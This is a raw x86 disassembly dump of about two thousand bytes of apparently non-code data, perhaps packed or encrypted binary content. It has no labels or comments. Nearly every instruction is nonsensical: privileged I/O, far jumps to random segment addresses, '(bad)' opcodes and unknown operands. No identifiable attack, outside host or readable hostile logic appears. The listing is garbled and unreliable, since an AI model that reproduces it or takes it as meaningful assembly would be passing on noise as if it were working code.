  416e83:	iret   
  416e84:	pop    edx
  416e85:	sub    DWORD PTR [ebp-0x47f7595f],ecx
  416e8b:	cmp    DWORD PTR [ebp+0x1a],0x2c
  416e8f:	sub    esp,DWORD PTR [edi+0x67]
  416e92:	imul   edi,eax,0x8ee460c4
  416e98:	sbb    eax,0x32a0bd39
  416e9d:	and    esp,DWORD PTR [esi+0x24]
  416ea0:	inc    ecx
  416ea1:	mov    dl,0x24
  416ea3:	into   
  416ea4:	pop    edi
  416ea5:	inc    esp
  416ea6:	xor    edi,DWORD PTR [esi-0x72]
  416ea9:	in     eax,0x59
  416eab:	sbb    DWORD PTR [eax+0x26],edi
  416eae:	jge    0x416e9e
  416eb0:	popaw  
  416eb2:	inc    ebx
  416eb3:	jo     0x416e3d
  416eb5:	ror    BYTE PTR ds:0xee28f554,cl
  416ebb:	mov    cl,0xcc
  416ebd:	cmc    
  416ebe:	aaa    
  416ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ec0:	stos   BYTE PTR es:[edi],al
  416ec1:	repz or ecx,DWORD PTR [ebp-0x1ec94b64]
  416ec8:	xor    eax,0xf427a17c
  416ecd:	sbb    eax,0x45e1b7ee
  416ed2:	pop    es
  416ed3:	dec    ebp
  416ed4:	pop    eax
  416ed5:	add    bl,al
  416ed7:	mov    WORD PTR [edi],?
  416ed9:	cmp    eax,0x54641a93
  416ede:	outs   dx,BYTE PTR ds:[esi]
  416edf:	pop    ss
  416ee0:	sbb    ebx,edi
  416ee2:	sub    dh,BYTE PTR [eax]
  416ee4:	pop    esi
  416ee5:	lds    esp,FWORD PTR [edx]
  416ee7:	xor    esp,DWORD PTR [ebp-0x56a4985b]
  416eed:	sub    al,0x70
  416eef:	jge    0x416f1e
  416ef1:	popa   
  416ef2:	cmc    
  416ef3:	jno    0x416ea0
  416ef5:	mov    dh,0x5a
  416ef7:	adc    edi,0xe23bee91
  416efd:	int3   
  416efe:	or     DWORD PTR [eax+0x3f],ebp
  416f01:	out    0x12,eax
  416f03:	test   al,0xb2
  416f05:	xchg   esi,eax
  416f06:	cmp    BYTE PTR [ecx+0x6e],bl
  416f09:	dec    ebp
  416f0a:	loopne 0x416e9f
  416f0c:	xchg   BYTE PTR [eax+0x79],cl
  416f0f:	fsub   QWORD PTR [eax+0x7f]
  416f12:	out    0x37,al
  416f14:	add    esp,DWORD PTR [ebx-0x74bfff1b]
  416f1a:	xor    al,0xa1
  416f1c:	js     0x416f8c
  416f1e:	pop    eax
  416f1f:	and    ebx,DWORD PTR [edi+0x63b53d11]
  416f25:	data16 adc dl,BYTE PTR [edx]
  416f28:	sbb    ah,BYTE PTR [ecx+0x56c7e3c9]
  416f2e:	add    esi,esp
  416f30:	sbb    DWORD PTR [edi-0x22],ebx
  416f33:	sbb    al,0x4
  416f35:	inc    eax
  416f36:	sbb    DWORD PTR ds:[esi+0x5e53f218],0xebf21c3b
  416f41:	add    esp,DWORD PTR [edi]
  416f43:	pop    esi
  416f44:	cmp    ah,BYTE PTR [ecx-0x5d]
  416f47:	mov    ebx,DWORD PTR [eax]
  416f49:	xchg   edi,eax
  416f4a:	jnp    0x416f99
  416f4c:	inc    eax
  416f4d:	dec    edi
  416f4e:	out    dx,al
  416f4f:	pop    edi
  416f50:	inc    ebp
  416f51:	out    dx,eax
  416f52:	scas   eax,DWORD PTR es:[edi]
  416f53:	stos   DWORD PTR es:[edi],eax
  416f54:	adc    ah,cl
  416f56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f57:	mov    eax,ds:0xe8fd5193
  416f5c:	push   es
  416f5d:	int    0xa0
  416f5f:	aas    
  416f60:	lods   al,BYTE PTR es:[esi]
  416f62:	lahf   
  416f63:	mov    eax,ds:0xf4549da4
  416f68:	iret   
  416f69:	call   0xcabff3f
  416f6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f6f:	loopne 0x416f4a
  416f71:	xchg   ebx,eax
  416f72:	mov    al,0x1b
  416f74:	imul   BYTE PTR [ebp+0x27e2a1ee]
  416f7a:	or     al,0x49
  416f7c:	out    0x3,al
  416f7e:	sub    ah,BYTE PTR [ecx+0x184fc615]
  416f84:	xchg   ebx,eax
  416f85:	shr    DWORD PTR [esi-0x7517a50f],0xc0
  416f8c:	cs xor al,0x2e
  416f8f:	cmc    
  416f90:	(bad)  
  416f91:	mov    ebp,0x77b8a116
  416f96:	push   es
  416f97:	add    BYTE PTR [ecx],dh
  416f99:	xchg   esp,esi
  416f9b:	test   BYTE PTR [esi],0x18
  416f9e:	pop    ebx
  416f9f:	mov    ds:0x9e4a395e,al
  416fa4:	imul   ebp,DWORD PTR [edi+0x60cb0fec],0x13
  416fab:	push   0xd4ebcb66
  416fb0:	call   0xa3b1:0x31d69e89
  416fb7:	mov    eax,ds:0x702d41b
  416fbc:	pushf  
  416fbd:	test   al,0x8f
  416fbf:	mov    eax,ds:0x2e6bcc9e
  416fc4:	inc    eax
  416fc5:	jbe    0x416fc3
  416fc7:	fs pusha 
  416fc9:	je     0x416f54
  416fcb:	jae    0x417049
  416fcd:	std    
  416fce:	jno    0x416f51
  416fd0:	sbb    al,0x21
  416fd2:	and    esp,DWORD PTR [ebp+ecx*2+0x6cc74014]
  416fd9:	test   BYTE PTR [eax],dl
  416fdb:	or     ecx,DWORD PTR [edx+0x3b20ee3d]
  416fe1:	icebp  
  416fe2:	into   
  416fe3:	sub    DWORD PTR [eax+0x45],eax
  416fe6:	push   0xffffffcf
  416fe8:	outs   dx,BYTE PTR ds:[esi]
  416fe9:	pop    ecx
  416fea:	sbb    bl,BYTE PTR [edi-0x856bf63]
  416ff0:	in     al,0x74
  416ff2:	out    dx,al
  416ff3:	inc    esi
  416ff4:	dec    ebp
  416ff5:	repz jp 0x416fa1
  416ff8:	mov    eax,ds:0xd68e28cd
  416ffd:	sbb    BYTE PTR [esi+0x7270d121],ah
  417003:	(bad)  
  417004:	gs or  eax,0xe3dec5f5
  41700a:	ret    0xeea0
  41700d:	adc    al,0x87
  41700f:	mov    BYTE PTR [eax+eiz*2-0x453c4f59],dl
  417016:	jl     0x417085
  417018:	repnz jmp 0x7941:0x7e7f3dee
  417020:	mov    cl,0x30
  417022:	test   BYTE PTR [ecx-0x61aa2752],ah
  417028:	push   ds
  417029:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41702a:	dec    esp
  41702b:	das    
  41702c:	jmp    0xd6b35bcf
  417031:	sti    
  417032:	dec    ebx
  417033:	cdq    
  417034:	cmp    eax,0x6872ecb9
  417039:	pusha  
  41703a:	adc    BYTE PTR [edi-0x32],0xaa
  41703e:	mov    edi,DWORD PTR [edx]
  417040:	test   eax,0x5e86f298
  417045:	test   eax,0xc6fd6aca
  41704a:	retf   
  41704b:	pop    ds
  41704c:	dec    esp
  41704d:	popa   
  41704e:	jnp    0x4170a2
  417050:	lahf   
  417051:	mov    ebx,0x24f86e71
  417056:	jmp    0x67c51708
  41705b:	xor    bl,bl
  41705d:	xchg   ebp,eax
  41705e:	mov    cs,WORD PTR [edx+0x6]
  417061:	xchg   esp,eax
  417062:	dec    ecx
  417063:	mov    eax,ds:0x6821ab7
  417068:	or     DWORD PTR [ebp-0x5e9f53f4],edi
  41706e:	mov    eax,0x624089fa
  417073:	push   esi
  417074:	jle    0x4170f1
  417076:	call   0xf491abb3
  41707b:	push   eax
  41707c:	mov    ds:0x959a045e,al
  417081:	jb     0x4170f6
  417083:	add    cl,BYTE PTR [ebx]
  417085:	pop    esi
  417086:	pop    ss
  417087:	mov    BYTE PTR [ebx-0x67],ah
  41708a:	dec    ecx
  41708b:	jecxz  0x4170d5
  41708d:	pop    edi
  41708e:	cmp    dh,BYTE PTR [ecx]
  417090:	aad    0x89
  417092:	and    eax,0x63699ec2
  417097:	pop    esi
  417098:	cmp    BYTE PTR [eax],bh
  41709a:	int    0xa4
  41709c:	adc    dh,BYTE PTR [edx+0x199e14b2]
  4170a2:	dec    esi
  4170a3:	adc    al,0x30
  4170a5:	popa   
  4170a6:	jle    0x41702e
  4170a8:	imul   ebp,DWORD PTR [eax+0xbe244ce],0x512a93ee
  4170b2:	push   ss
  4170b3:	adc    eax,0xa2a8c629
  4170b8:	out    dx,eax
  4170b9:	sbb    DWORD PTR [eax+0x4e6e132c],eax
  4170bf:	test   eax,0x32eeeded
  4170c4:	inc    ebp
  4170c5:	int    0x99
  4170c7:	rcr    DWORD PTR [eax+edi*1+0x5f22a12a],cl
  4170ce:	mov    bl,bh
  4170d0:	inc    ecx
  4170d1:	into   
  4170d2:	arpl   WORD PTR [ecx],si
  4170d4:	arpl   WORD PTR [ebx+ecx*4],ax
  4170d7:	(bad)  
  4170d8:	ffreep st(0)
  4170da:	jns    0x417122
  4170dc:	int    0xd4
  4170de:	pop    edi
  4170df:	imul   edi,DWORD PTR [ecx],0xe97aac61
  4170e5:	mov    dl,0x30
  4170e7:	xor    al,0x8f
  4170e9:	inc    edi
  4170ea:	lock and DWORD PTR [esi],0x240e7166
  4170f1:	or     al,0x9
  4170f3:	loope  0x417121
  4170f5:	push   esi
  4170f6:	inc    esi
  4170f7:	jg     0x417173
  4170f9:	pusha  
  4170fa:	js     0x4170e7
  4170fc:	mov    edx,DWORD PTR [ebp-0x24d99a90]
  417102:	jmp    0x41708b
  417104:	loope  0x417154
  417106:	xor    eax,0xc398e2cb
  41710b:	loope  0x41711f
  41710d:	sub    BYTE PTR [ebp-0x5f],dh
  417110:	jne    0x417162
  417112:	call   0x71c01386
  417117:	fldenv [ebp+0x1]
  41711a:	and    BYTE PTR [edx+eax*1],ah
  41711d:	(bad)  
  41711f:	sbb    al,0x5e
  417121:	les    ecx,FWORD PTR [edx]
  417123:	ins    DWORD PTR es:[edi],dx
  417124:	jmp    DWORD PTR [ebp-0x65]
  417127:	mov    eax,ds:0xbe0b2bab
  41712c:	mov    esp,0x5e189195
  417131:	loopne 0x41719a
  417133:	fcmovu st,st(4)
  417135:	rcr    DWORD PTR [eax],0xcb
  417138:	dec    eax
  417139:	jne    0x41714a
  41713b:	imul   edi,DWORD PTR [edi+0x7232fe60],0x5dc6a446
  417145:	call   0xc773ff03
  41714a:	std    
  41714b:	and    BYTE PTR [edx+0x66],ch
  41714e:	lods   al,BYTE PTR ds:[esi]
  41714f:	mov    al,ds:0xd3791473
  417154:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417155:	outs   dx,BYTE PTR ds:[esi]
  417156:	iret   
  417157:	gs stos DWORD PTR es:[edi],eax
  417159:	loopne 0x41713a
  41715b:	cmp    bh,bl
  41715d:	ins    BYTE PTR es:[edi],dx
  41715e:	add    dh,BYTE PTR [ecx-0x5f]
  417161:	pusha  
  417162:	inc    edx
  417163:	mov    DWORD PTR [eax-0x2fcffc21],esi
  417169:	mov    ch,0xee
  41716b:	arpl   di,si
  41716d:	jge    0x417138
  41716f:	sbb    al,0x9e
  417171:	cwde   
  417172:	cmp    DWORD PTR [edi-0x44e35b29],ebx
  417178:	stc    
  417179:	sbb    ch,BYTE PTR [ebx+0x2d]
  41717c:	adc    ah,BYTE PTR [eax+0x6d]
  41717f:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417181:	xchg   ebp,eax
  417182:	jae    0x417131
  417184:	out    dx,al
  417185:	ja     0x417185
  417187:	mov    al,ds:0x62b1bf03
  41718c:	div    dh
  41718e:	sahf   
  41718f:	dec    ebp
  417190:	pop    esi
  417191:	mov    ch,0xd7
  417193:	adc    esp,ebp
  417195:	mov    ebx,0x6699323f
  41719a:	pusha  
  41719b:	mov    edi,0x9b866bd9
  4171a0:	sbb    eax,0xa0112e61
  4171a5:	ret    0xe426
  4171a8:	arpl   WORD PTR [ebp+0x5d],bx
  4171ab:	imul   ebp,DWORD PTR [esi],0x49b4de21
  4171b1:	sbb    ebp,ebx
  4171b3:	jmp    0xc499:0x32ca5a68
  4171ba:	fist   WORD PTR [ecx+0x64]
  4171bd:	pop    es
  4171be:	in     al,dx
  4171bf:	mov    al,0x24
  4171c1:	sub    al,0xed
  4171c3:	loop   0x41718d
  4171c5:	cdq    
  4171c6:	jecxz  0x4171ef
  4171c8:	test   eax,0xc65356d0
  4171cd:	xor    BYTE PTR [esi],ah
  4171cf:	mov    eax,ds:0x2572953e
  4171d4:	jbe    0x41718c
  4171d6:	in     eax,dx
  4171d7:	xor    BYTE PTR [esi+0x4a],bl
  4171da:	scas   al,BYTE PTR es:[edi]
  4171db:	cmp    eax,0x29d4b3d4
  4171e0:	and    esp,DWORD PTR [ecx+0x7e]
  4171e3:	mov    ch,BYTE PTR [ebx]
  4171e5:	sub    BYTE PTR [ecx-0x11046db3],bh
  4171eb:	mov    eax,ds:0x6c333ad1
  4171f0:	fwait
  4171f1:	ss clc 
  4171f3:	mov    al,ds:0xbc484e41
  4171f8:	call   0xf339:0x5e27bf78
  4171ff:	xor    BYTE PTR [edx-0xb],ch
  417202:	xchg   DWORD PTR [edx+0x5830008f],ecx
  417208:	jno    0x41726a
  41720a:	push   es
  41720b:	or     bh,ch
  41720d:	add    eax,0xec3c240b
  417212:	add    cl,dh
  417214:	inc    edx
  417215:	inc    ebp
  417216:	popa   
  417217:	mov    eax,ds:0x3e81ac29
  41721c:	cmp    DWORD PTR [edi],0x97d3a389
  417222:	xor    BYTE PTR [ebx+0x62],0x59
  417226:	into   
  417227:	sub    BYTE PTR [eax],cl
  417229:	mov    esi,ebp
  41722b:	sbb    DWORD PTR [ebx+0xac5de6a],esi
  417231:	enter  0xa85a,0xb0
  417235:	jns    0x417268
  417237:	mov    esp,?
  417239:	lock stos DWORD PTR es:[edi],eax
  41723b:	pusha  
  41723c:	mov    al,ds:0xdd901f0d
  417241:	pusha  
  417242:	(bad)  
  417243:	lods   eax,DWORD PTR ds:[esi]
  417244:	test   BYTE PTR [edi+0x2f],0xcf
  417248:	push   edi
  417249:	push   ebx
  41724a:	and    eax,0xb08a6efc
  41724f:	mov    esp,0x537d6e5e
  417254:	pop    ds
  417255:	adc    ebp,esi
  417257:	mov    dl,0xe4
  417259:	lock mov bl,0x87
  41725c:	dec    edx
  41725d:	not    DWORD PTR [esi]
  41725f:	scas   al,BYTE PTR es:[edi]
  417260:	or     ebx,esi
  417262:	out    dx,al
  417263:	sub    al,0x3b
  417265:	inc    edi
  417266:	jmp    0x63e8:0x2fcfc4a
  41726d:	enter  0x35ed,0xc
  417271:	test   al,ch
  417273:	and    ah,BYTE PTR [edx+0x13a158cd]
  417279:	test   DWORD PTR [edx],edx
  41727b:	out    0x53,al
  41727d:	pop    ds
  41727e:	es call 0x8667c87a
  417284:	cmp    edx,edx
  417286:	ja     0x41725a
  417288:	ins    BYTE PTR es:[edi],dx
  417289:	or     dh,0x36
  41728c:	xchg   DWORD PTR [edx-0x7cc25f17],ebx
  417292:	leave  
  417293:	sub    eax,0xedfa579f
  417298:	pop    esi
  417299:	sub    eax,0x7abf32cd
  41729e:	add    ebp,DWORD PTR [edi+ecx*4-0x74e5e1a0]
  4172a5:	repz adc bl,BYTE PTR [ebp-0x5d118d38]
  4172ac:	xor    ebx,ebx
  4172ae:	mov    al,ds:0x23883a30
  4172b3:	scas   eax,DWORD PTR es:[edi]
  4172b4:	lgs    ecx,FWORD PTR [edx]
  4172b7:	lahf   
  4172b8:	fwait
  4172b9:	pusha  
  4172ba:	test   al,0xae
  4172bc:	add    edi,0xffffffd0
  4172bf:	jno    0x41731f
  4172c1:	xchg   ebp,eax
  4172c2:	mul    BYTE PTR [ecx]
  4172c4:	push   ecx
  4172c5:	dec    edx
  4172c6:	inc    ebx
  4172c7:	int    0x29
  4172c9:	inc    edx
  4172ca:	jo     0x4172fc
  4172cc:	xchg   ebp,eax
  4172cd:	loopne 0x417280
  4172cf:	in     eax,0x8d
  4172d1:	mov    eax,0x795b49a6
  4172d6:	push   eax
  4172d7:	dec    edi
  4172d8:	lds    ecx,FWORD PTR [eax+0x4e]
  4172db:	push   esp
  4172dc:	jmp    0x41729d
  4172de:	sub    BYTE PTR [edx+0x580409b4],ah
  4172e4:	call   0x1ea4da96
  4172e9:	stc    
  4172ea:	sahf   
  4172eb:	xchg   esp,eax
  4172ec:	pop    ebp
  4172ed:	cmc    
  4172ee:	leave  
  4172ef:	shl    eax,cl
  4172f1:	jnp    0x41732c
  4172f3:	sbb    DWORD PTR [esi+0x4a],edi
  4172f6:	out    0xa7,eax
  4172f8:	sub    esi,edx
  4172fa:	push   ecx
  4172fb:	push   0xffffffc7
  4172fd:	jo     0x417282
  4172ff:	dec    ebx
  417300:	add    cl,ah
  417302:	out    dx,al
  417303:	mov    ch,0x2e
  417305:	push   edi
  417306:	xchg   BYTE PTR [edi+0x1b],al
  417309:	je     0x41737f
  41730b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41730c:	jmp    0x417374
  41730e:	sub    dl,BYTE PTR [eax]
  417310:	or     eax,0x70413615
  417315:	ret    
  417316:	lock and eax,0xcb06636
  41731c:	push   ebx
  41731d:	arpl   bp,bp
  41731f:	out    dx,al
  417320:	sahf   
  417321:	test   al,0x39
  417323:	sub    eax,0x82add472
  417328:	into   
  417329:	pusha  
  41732a:	stc    
  41732b:	and    ebp,eax
  41732d:	jecxz  0x41733f
  41732f:	pop    eax
  417330:	and    eax,0x134fee38
  417335:	mov    bl,0xe2
  417337:	mov    cl,0xd5
  417339:	stc    
  41733a:	addr16 mov ds:0xb5c4,al
  41733e:	int3   
  41733f:	imul   edi,DWORD PTR [ebx+0x46],0x17305d2c
  417346:	out    0xfe,eax
  417348:	mov    BYTE PTR [ebx+0x7effa795],cl
  41734e:	into   
  41734f:	jo     0x417339
  417351:	lock and DWORD PTR [ecx+edi*2-0x721af433],esp
  417359:	sub    DWORD PTR [ebp+0x2bad00ad],eax
  41735f:	sub    BYTE PTR [esi-0x15],bl
  417362:	loop   0x41732d
  417364:	imul   edi,DWORD PTR [ebp+0x44bb5a49],0xffffff8b
  41736b:	ins    BYTE PTR es:[edi],dx
  41736c:	outs   dx,DWORD PTR ds:[esi]
  41736d:	mov    al,ds:0x9044fbc1
  417372:	pop    ss
  417373:	pop    esi
  417374:	pop    esi
  417375:	mov    bl,0x99
  417377:	mov    al,BYTE PTR [esi+0x1f]
  41737a:	call   0x5ca25e3f
  41737f:	mov    ebp,0x955a58e3
  417384:	stos   BYTE PTR es:[edi],al
  417385:	mov    esi,gs
  417387:	xchg   ebp,eax
  417388:	push   edi
  417389:	dec    edx
  41738a:	jg     0x417384
  41738c:	popf   
  41738d:	sub    eax,0x999ca0ce
  417392:	xchg   ebp,eax
  417393:	pop    ds
  417394:	loop   0x417405
  417396:	out    0x6c,eax
  417398:	pop    esi
  417399:	int    0x91
  41739b:	xchg   ebx,eax
  41739c:	add    eax,0x6f0e7b2a
  4173a1:	pusha  
  4173a2:	jmp    0xa29e:0x93325cb2
  4173a9:	adc    DWORD PTR [eax],0x1d
  4173ac:	mov    al,ds:0xa318ed64
  4173b1:	mov    esp,0xc9925df6
  4173b6:	(bad)  
  4173b7:	mov    al,ds:0x9dbe2da6
  4173bc:	sahf   
  4173bd:	je     0x417439
  4173bf:	(bad)  
  4173c0:	pop    esi
  4173c1:	(bad)  
  4173c2:	pop    esp
  4173c3:	sysexit 
  4173c5:	push   esi
  4173c6:	mov    eax,0x2061032d
  4173cb:	xor    esi,DWORD PTR [ebp+eiz*4-0x1c]
  4173cf:	ins    BYTE PTR es:[edi],dx
  4173d0:	fstp   TBYTE PTR [edi-0x12]
  4173d3:	mov    bl,0x82
  4173d5:	dec    eax
  4173d6:	push   ebp
  4173d7:	popa   
  4173d8:	mov    edx,0x60f1af3a
  4173dd:	popa   
  4173de:	jmp    0xa004:0xfd7be532
  4173e5:	cmp    esi,ebp
  4173e7:	pop    edx
  4173e8:	lea    eax,[edx-0xfdab6b2]
  4173ee:	xor    esp,DWORD PTR [ecx-0x248325e5]
  4173f4:	sbb    DWORD PTR [eax],ecx
  4173f6:	shl    BYTE PTR [edx+0x5b],0xe6
  4173fa:	fstp   QWORD PTR [ecx+0x213e34b6]
  417400:	or     eax,esp
  417402:	mov    al,gs:0x32b49da2
  417408:	pop    esi
  417409:	jecxz  0x4173ae
  41740b:	test   BYTE PTR [edx+edx*8-0x12],ch
  41740f:	mov    cl,0xf8
  417411:	ret    0xa9b0
  417414:	add    BYTE PTR [ecx-0x3],bl
  417417:	mov    al,ds:0x5bddf1cf
  41741c:	retf   0x645e
  41741f:	scas   eax,DWORD PTR es:[edi]
  417420:	xor    eax,DWORD PTR [ebx-0x3b]
  417423:	lea    eax,[edx-0x5469913d]
  417429:	push   0xffffffbb
  41742b:	xchg   esi,eax
  41742c:	cmc    
  41742d:	pusha  
  41742e:	ss or  BYTE PTR ds:[edx-0x1d],cl
  417433:	add    al,0x91
  417435:	cmp    BYTE PTR [ebx],ah
  417437:	push   es
  417438:	xchg   esp,eax
  417439:	pusha  
  41743a:	js     0x4174a0
  41743c:	mov    cl,0xf
  41743e:	sub    DWORD PTR [ebp+0x16],esp
  417441:	pop    eax
  417442:	xor    al,0x95
  417444:	ja     0x417403
  417446:	outs   dx,BYTE PTR ds:[esi]
  417447:	std    
  417448:	repnz cmp eax,0xc2533fbe
  41744e:	fwait
  41744f:	mov    ah,0x5e
  417451:	mov    cl,0x7b
  417453:	inc    edx
  417454:	xor    ebx,DWORD PTR [eax+0x4b]
  417457:	mov    eax,ds:0xac669c48
  41745c:	cmp    ch,BYTE PTR [edi]
  41745e:	fstp   DWORD PTR [esi+0x199fb75e]
  417464:	dec    ebp
  417465:	sbb    dh,cl
  417467:	imul   esp,ebp,0x60
  41746a:	jo     0x417405
  41746c:	mov    bl,BYTE PTR [esi]
  41746e:	jmp    0x41746f
  417470:	pusha  
  417471:	mov    ch,dh
  417473:	xor    eax,0x404bdac7
  417478:	xchg   esp,eax
  417479:	scas   al,BYTE PTR es:[edi]
  41747a:	sub    ah,BYTE PTR [ecx-0x45718443]
  417480:	ins    BYTE PTR es:[edi],dx
  417481:	(bad)  
  417482:	call   FWORD PTR [edi+0x205e585b]
  417488:	and    ah,BYTE PTR [edi+0x5e]
  41748b:	cwde   
  41748c:	pop    esp
  41748d:	sub    ebp,DWORD PTR [ecx]
  41748f:	mov    eax,ds:0x62cc799f
  417494:	xor    al,0x5a
  417496:	div    BYTE PTR [ebx+0x38]
  417499:	xor    esp,DWORD PTR [esi-0xac1ad14]
  41749f:	mov    cs:0x3f818281,eax
  4174a5:	adc    DWORD PTR [eax+eiz*8-0x5f0a0f25],0xf710edba
  4174b0:	mov    ds:0x342de6b9,eax
  4174b5:	das    
  4174b6:	and    DWORD PTR es:[edi+0x6d3e0487],eax
  4174bd:	adc    BYTE PTR [edx],dl
  4174bf:	test   al,0x2b
  4174c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174c2:	outs   dx,DWORD PTR ds:[esi]
  4174c3:	stos   DWORD PTR es:[edi],eax
  4174c4:	mov    ds:0x9f94cee0,eax
  4174c9:	call   0xa97b2dbc
  4174ce:	or     eax,0x519bd56a
  4174d3:	ins    DWORD PTR es:[edi],dx
  4174d4:	test   DWORD PTR [eax+0x1a],esp
  4174d7:	push   ss
  4174d8:	lea    eax,[edx-0x3f]
  4174db:	mov    edi,0xf90ac2df
  4174e0:	lods   eax,DWORD PTR ds:[esi]
  4174e1:	push   eax
  4174e2:	out    dx,al
  4174e3:	or     ecx,ebx
  4174e5:	sub    BYTE PTR [edx-0x5e9edeee],0x96
  4174ec:	pop    ss
  4174ed:	sbb    cl,ch
  4174ef:	out    0x6a,al
  4174f1:	adc    DWORD PTR [eax+eax*2],esp
  4174f4:	mov    esi,0x1d0d73db
  4174f9:	ret    0x802e
  4174fc:	imul   esi,eax,0x10aca165
  417502:	fsubrp st(2),st
  417504:	mov    cl,0x91
  417506:	mov    bh,0xe4
  417508:	pop    ecx
  417509:	sub    dh,al
  41750b:	pop    eax
  41750c:	inc    ecx
  41750d:	imul   ebp,DWORD PTR [ebp-0x6e],0xf527ecd
  417514:	loopne 0x417576
  417516:	ins    DWORD PTR es:[edi],dx
  417517:	scas   eax,DWORD PTR es:[edi]
  417518:	mov    esp,0xa40e291d
  41751d:	dec    esi
  41751e:	out    dx,al
  41751f:	scas   eax,DWORD PTR es:[edi]
  417520:	fst    DWORD PTR [ecx]
  417522:	aad    0x12
  417524:	pushf  
  417525:	iret   
  417526:	sub    DWORD PTR [ecx+0x256e037c],0x3
  41752d:	lods   al,BYTE PTR ds:[esi]
  41752e:	jne    0x4174be
  417530:	and    al,0xc5
  417532:	out    dx,al
  417533:	mov    ds:0x4989e176,eax
  417538:	ficomp WORD PTR [ebx-0x65]
  41753b:	mov    edi,0xa12de3a3
  417540:	or     esi,DWORD PTR [edx]
  417542:	add    eax,0xee86c968
  417547:	inc    esi
  417548:	dec    ebx
  417549:	mov    ah,0xd0
  41754b:	cmp    edi,DWORD PTR [ebp+0x27c76efc]
  417551:	pushf  
  417552:	and    eax,0xa7a502a1
  417557:	sub    eax,esp
  417559:	int3   
  41755a:	jle    0x41754a
  41755c:	pop    edi
  41755d:	xchg   ebp,eax
  41755e:	xchg   edx,eax
  41755f:	xor    al,0x3e
  417561:	cmp    BYTE PTR [edi-0x65557b8f],cl
  417567:	mov    eax,ds:0x1e9e5d9a
  41756c:	dec    eax
  41756d:	push   edx
  41756e:	pop    ss
  41756f:	inc    edx
  417570:	jo     0x4175cd
  417572:	out    dx,al
  417573:	mov    cl,0x89
  417575:	xor    esp,DWORD PTR [edi+0x3e5746b9]
  41757b:	mov    eax,ds:0x3adda686
  417580:	dec    ecx
  417581:	popf   
  417582:	in     eax,dx
  417583:	call   0x8f55d4e6
  417588:	test   eax,0x85b4303a
  41758d:	pusha  
  41758e:	dec    esp
  41758f:	pop    ebp
  417590:	cli    
  417591:	xor    DWORD PTR [edx-0x11a25228],edx
  417597:	mov    dl,0x10
  417599:	pusha  
  41759a:	push   eax
  41759b:	(bad)  
  41759c:	cmp    dh,dl
  41759e:	arpl   WORD PTR [edx-0x11ae782c],sp
  4175a4:	dec    edx
  4175a5:	fild   DWORD PTR [eax+0x71]
  4175a8:	(bad)  
  4175a9:	mov    eax,ds:0x5b5e384e
  4175ae:	jl     0x417607
  4175b0:	mov    dl,ah
  4175b2:	xchg   ebx,eax
  4175b3:	push   edx
  4175b4:	cmp    ah,BYTE PTR [ecx+0x3b]
  4175b7:	or     esp,ebp
  4175b9:	out    0xcd,al
  4175bb:	jmp    0x13ac:0xdaeebfc5
  4175c2:	clc    
  4175c3:	sub    al,0x41
  4175c5:	fs leave 
  4175c7:	mov    al,ds:0xa4ef75ef
  4175cc:	sub    ah,ah
  4175ce:	jecxz  0x41759f
  4175d0:	pop    esi
  4175d1:	xchg   ebx,edx
  4175d3:	dec    esi
  4175d4:	das    
  4175d5:	call   0x60cbfa1d
  4175da:	push   0xac5988b3
  4175df:	adc    dl,BYTE PTR [edx]
  4175e1:	sbb    BYTE PTR [ecx-0x3f],0xcf
  4175e5:	sub    esp,DWORD PTR [esi+0x62]
  4175e8:	pop    esi
  4175e9:	int    0x86
  4175eb:	cmp    DWORD PTR [ecx+0x55a1b538],ebx
  4175f1:	and    esi,DWORD PTR ds:0xeebfb5ad
  4175f7:	and    bl,BYTE PTR [ebx+0x6a25e4a8]
  4175fd:	and    ch,dh
  4175ff:	push   0xffffffd7
  417601:	push   ss
  417602:	add    al,0x96
  417604:	movaps XMMWORD PTR [eax],xmm5
  417607:	mov    eax,0xc11cea45
  41760c:	xor    al,0xe1
  41760e:	mov    DWORD PTR [ebx],esp
  417610:	dec    ebx
  417611:	jecxz  0x417597
  417613:	dec    edx
  417614:	pop    esi
  417615:	sbb    eax,0x15af79f1
  41761a:	mov    ecx,0xb7613c84
  41761f:	xchg   edx,eax
  417620:	int    0xfd
  417622:	lods   al,BYTE PTR ds:[esi]
  417623:	out    dx,al
  417624:	and    cl,BYTE PTR [esi-0x12]
  417627:	inc    edi
  417628:	shl    DWORD PTR [edi],0x63
  41762b:	pop    esi
  41762c:	dec    ecx
  41762d:	les    ecx,FWORD PTR [ecx+eiz*4+0x25a52e31]
  417634:	adc    DWORD PTR [edi-0x39a1e183],esi
  41763a:	lods   al,BYTE PTR ds:[esi]
  41763b:	xchg   BYTE PTR [esi],ch
  41763d:	js     0x4176b2
  41763f:	mov    ah,0x7b
  417641:	mov    ds:0x857aa101,al
  417646:	add    eax,DWORD PTR [eax]
  417648:	adc    BYTE PTR [ecx+ebp*1],dh
  41764b:	divps  xmm3,XMMWORD PTR [esi-0x11a3bfcb]
  417652:	xor    ch,BYTE PTR [ebx+eax*2+0x61]
  417656:	mov    DWORD PTR [ecx+0x4aa0af02],ebx
  41765c:	push   esp
  41765d:	repz and ebp,DWORD PTR ss:[ecx-0x3a]
  417662:	mov    edi,0x1d271823
  417667:	pop    ecx
  417668:	dec    ebp
  417669:	dec    esi
  41766a:	and    DWORD PTR [ecx-0x71fb2c18],0x37
  417671:	jp     0x417669
  417673:	cmp    al,0x5e
  417675:	out    dx,eax
  417676:	sub    eax,0xc5efa10d
  41767b:	aad    0xf
  41767d:	sub    al,0xc4
  41767f:	push   0x34c660fa
  417684:	dec    ecx
  417685:	(bad)  
  417686:	aas    
  417687:	call   0x562fc404
  41768c:	or     edi,DWORD PTR [ebx-0x59f6087]
  417692:	xor    eax,0xf47a7ba1
  417697:	and    eax,DWORD PTR [ebp+0xf]
  41769a:	push   edx
  41769b:	xor    al,0x5e
  41769d:	jno    0x4176b7
  41769f:	(bad)  
  4176a0:	loop   0x417683
  4176a2:	sub    eax,0xfe5798b9
  4176a7:	fld    DWORD PTR [eax+0x62fbee59]
  4176ad:	push   esp
  4176ae:	call   0x5e23:0x71f6464d
